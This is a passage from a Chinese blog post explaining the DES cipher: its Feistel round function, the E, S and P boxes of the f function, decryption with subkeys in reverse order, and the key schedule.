<h3 id="迭代运算中的圈（轮）函数"><a href="#迭代运算中的圈（轮）函数" class="headerlink" title="迭代运算中的圈（轮）函数"></a>迭代运算中的圈（轮）函数</h3><p>接下来就到了核心——迭代运算。</p>
<p>以加密流程图的第 1 轮运算为例讲解：</p>
<p><img src="https://i.loli.net/2020/11/04/nQVcy12LBGfbewq.png" style="zoom:80%;" /></p>
<p>如上，第 1 轮中，被初始置换后的 64 bit 明文数据分为左半部分 $L_0$ 和右半部分 $R_0$ 各 32 bit ，右半部分 $R_0$ 在 48 比特圈（子）密钥 $k_1$ 的作用下进行 $f$ 变换，得到的 32 比特数据再与左半部分 $L_0$ 按位异或，产生的 32 bit 作为下一轮迭代的右半部分即 $R_1$ ，原右半部分直接作为下一轮迭代的左半部分 $L_1$ 。</p>
<p>但我们看加密流程的第 16 轮：</p>
<p><img src="https://i.loli.net/2020/11/04/RUyJs56Ggq8oaLD.png" style="zoom:80%;" /></p>
<p>很明显，并没有像第 1 轮那样，最后得出的运算结果要交叉给后面的数据，也就是说，<strong>最后一轮，我们不进行左右块对换。</strong></p>
<p>综上，圈函数的数学描述如下：</p>
<script type="math/tex; mode=display">
L_i=R_{i-1},R_i=L_{i-1}\bigoplus f(R_{i-1},k_i),i=1,2,...,16</script><p>口诀的话，记个“上右给下左，上左异F，十六钢管直”好了（？</p>
<blockquote>
<p>这里是更深层面上的理解，跟上面表达式差不多，但提到了 Feistel 函数、对合变换这几个概念，“不求甚解”的朋友可以略过。</p>
<p><strong>Feistel 函数</strong></p>
<p><img src="https://i.loli.net/2020/11/04/NS2IU9BujZrx8F5.png" style="zoom:80%;" /></p>
<p>这个函数也就是前 15 轮的函数模型，我们设 Feistel 函数为 $F_k(x,y)=(x \bigoplus f(y,k),y)$  ，这就是两者计算的最后结果，最后我们需要的只有 exchange ，即设 $D(x,y)=(y,x)$ 为左右块对换，而前 15 轮的轮函数$Q_k(x,y)$ 可表示为这两个函数的复合：</p>
<script type="math/tex; mode=display">
Q_k(x,y)=D(F_k(x,y))=D(x\bigoplus f(y,k),y)=(y,x\bigoplus f(y,k))</script><p>而第 16 轮不就是没有块对换的 $F_k(x,y)$ 吗？</p>
<p><strong>对合变换</strong></p>
<p>定义：设 $g:X\to X$，如果对任意 $x\in X$ ，均有 $g(g(x))=x$ ，则称 $g$ 为对合变换。</p>
<p>很容易得出，左右块对换 $D(x,y)$ 是对合变换。</p>
<p>而 $F_k(x,y)$ 呢？</p>
<script type="math/tex; mode=display">
F_k(F_k(x,y))=F_k(x\bigoplus f(y,k),y)=(x\bigoplus f(y,k)\bigoplus f(y,k),y)=(x,y)</script><p>自然也是对合变换，综上，轮函数 $Q_k(x,y)$ 也是对合变换，因为 $IP$ 与 $IP^{-1}$ 是互逆的，我们最终可以得出：</p>
<script type="math/tex; mode=display">
DES^{-1}(DES(M))=M</script><p>这样一条定理。</p>
</blockquote>
<p>说了这么多，$f$ 函数到底是什么呢？</p>
<h4 id="f-函数"><a href="#f-函数" class="headerlink" title="f 函数"></a>f 函数</h4><p>$f$ 函数是 DES 加、脱密算法的核心，也是用来<strong>实现混乱与扩散</strong>这两个分组密码设计原则的函数。由上面轮函数的表达式来看，$f$ 是有两个输入 y、k 的（即圈输入右半部分的 32 bit 数据 $R$ ，另一个是由初始密钥通过密钥生成算法产生的 48 bit 圈（子）密钥 k ）。</p>
<p><img src="https://i.loli.net/2020/11/04/63ucksj1gA5zE9X.png" style="zoom:80%;" /></p>
<p>图中的 E 表示扩展变换 E 盒，S 表示非线性代替 S盒，P 表示比特移位变换 P 盒。</p>
<p>$f$ 函数可表示为以下数学表达式：</p>
<script type="math/tex; mode=display">
f(R,k)=PS(E(R)\bigoplus k)</script><p>接下来我们来解释 E、S、P 这三种变换。</p>
<h5 id="扩展变换-E-盒-（-32-bit-gt-48-bit-）"><a href="#扩展变换-E-盒-（-32-bit-gt-48-bit-）" class="headerlink" title="扩展变换 E 盒 （ 32 bit -&gt; 48 bit ）"></a>扩展变换 E 盒 （ 32 bit -&gt; 48 bit ）</h5><p>作用是将 32 bit 数据扩展为 48 bit 数据。</p>
<p><img src="https://i.loli.net/2020/11/04/jUZxdvIlPBfw25t.png" style="zoom:80%;" /></p>
<p>简单来说就是将原始的 32 bit 分为 8 组，每组 4 bit ，这样每组都有左相邻和右相邻的比特，左相邻放左边，右相邻放右边，比较极端的例子如 $a_1$ 的左相邻是 $a_{32}$ ，$a_{32}$ 的右相邻自然是 $a_1$ 。</p>
<h5 id="非线性代替-S盒-（-48-bit-gt-32-bit-）"><a href="#非线性代替-S盒-（-48-bit-gt-32-bit-）" class="headerlink" title="非线性代替 S盒 （ 48 bit -&gt; 32 bit ）"></a>非线性代替 S盒 （ 48 bit -&gt; 32 bit ）</h5><p>作用是将 E 盒扩展后的 48 bit 数据与 48 bit 圈（子）密钥按位异或，然后将得到的 48 bit 数据从左到右也分为 8 组，每组 6 比特，作为 $S_1$，$S_2$，…，$S_8$ 的输入。</p>
<p>这里的运算是：</p>
<ul>
<li>行号：由每组 6 比特中的 $a_1a_6$ 对应的十进制数得出。</li>
<li>列号：由每组 6 比特中的 $a_2a_3a_4a_5$ 对用的十进制数得出。</li>
</ul>
<p>然后对照下表查找到的十进制数再转换为 4 位二进制数作为输出。</p>
<p><img src="https://i.loli.net/2020/11/04/jMAglhkJBcviNK8.png" style="zoom: 80%;" /></p>
<h5 id="比特移位变换-P-盒"><a href="#比特移位变换-P-盒" class="headerlink" title="比特移位变换 P 盒"></a>比特移位变换 P 盒</h5><p>P 盒是对 S 盒变换后的 32 bit 数据进行比特移位。</p>
<p><img src="https://i.loli.net/2020/11/04/LB3S1Iik4peRfOd.png" style="zoom:80%;" /></p>
<p>也就是和初始置换一样的“对号入座”。</p>
<p>加密算法讲到这里为止，理解了这些，下面的脱密算法很快能熟悉掌握。</p>
<h2 id="脱密算法"><a href="#脱密算法" class="headerlink" title="脱密算法"></a>脱密算法</h2><p>DES 的脱密算法和加密运算用的是同一个算法，二者的唯一不同是圈（子）密钥的使用次序相反，如加密过程中第 1-16 轮子密钥的使用次序是 $k_1$，$k_2$，…，$k_{16}$ ，那么脱密就是 $k_{16}$，…，$k_2$，$k_1$ 。</p>
<p>其他都是相同。</p>
<h2 id="密钥生成算法"><a href="#密钥生成算法" class="headerlink" title="密钥生成算法"></a>密钥生成算法</h2><p>前面说过，DES 的输入密钥长度是 64 bit（有效密钥长度 56 bit），但我们进行迭代运算时用到的子密钥长度只有 48 bit ，这里就有关于密钥生成算法。</p>
<p><img src="https://i.loli.net/2020/11/04/zZJmKlIF9vcuwLG.png" style="zoom: 67%;" /></p>
<p>如上图，子密钥生成有关运算如下：</p>
<ul>
<li>置换选择 1</li>
<li>循环移位</li>
<li>置换选择 2</li>
</ul>
<h3 id="置换选择-1-（-64-bit-gt-56-bit）"><a href="#置换选择-1-（-64-bit-gt-56-bit）" class="headerlink" title="置换选择 1 （ 64 bit -&gt; 56 bit）"></a>置换选择 1 （ 64 bit -&gt; 56 bit）</h3><p>首先，每个字节的第八比特会被舍弃。</p>
<p><img src="https://i.loli.net/2020/11/04/TsgrL1kDhM5IKS7.png" style="zoom:80%;" /></p>
<p>然后再按照下表“对号入座”，得到的就是有效密钥。</p>
<p><img src="https://i.loli.net/2020/11/04/7D4wzfMvK5xY6Wy.png" style="zoom: 50%;" /></p>
<h3 id="循环移位"><a href="#循环移位" class="headerlink" title="循环移位"></a>循环移位</h3><p>然后将有效密钥 56 bit 分为左半部分 $C_0$ 和右半部分 $D_0$ 各 28 bit ，就如置换选择 1 的置换表划分的那样，上面就是 $C_0$ ，下面就是 $D_0$ 。</p>
<p>由 $C_0$ 和 $D_0$ 出发，$k_i$ 产生的具体过程如下：</p>
<ul>
<li><p>首先分别对 $C_{i-1}$ 和 $D_{i-1}$ 进行循环左移得到 $C_i$ 和 $D_i$ ，循环左移的位数与其所在的圈数 i 如下图所示：</p>
<p><img src="https://i.loli.net/2020/11/04/BMuzOgC28qXDSyf.png" style="zoom: 67%;" /></p>
</li>
<li><p>对 $C_i$ 和 $D_i$ 进行置换选择 2，仍是“对号入座”：</p>
<p><img src="https://i.loli.net/2020/11/04/yxUWLDaMzVjeEpS.png" style="zoom: 50%;" /></p>
</li>
</ul>
<p>由于 C 寄存器和 D 寄存器循环左移的位数都是 28 ，所以 $C_{16}=C_0$ ，$D_{16}=D_0$ ，在完成对一个明文分组加密后，就保证了 C 寄存器和 D 寄存器又回到了初始状态。</p>
<p>到这里，DES 的算法就介绍完毕了，希望对你有所帮助！</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>DES</tag>
      </tags>
  </entry>
</search>
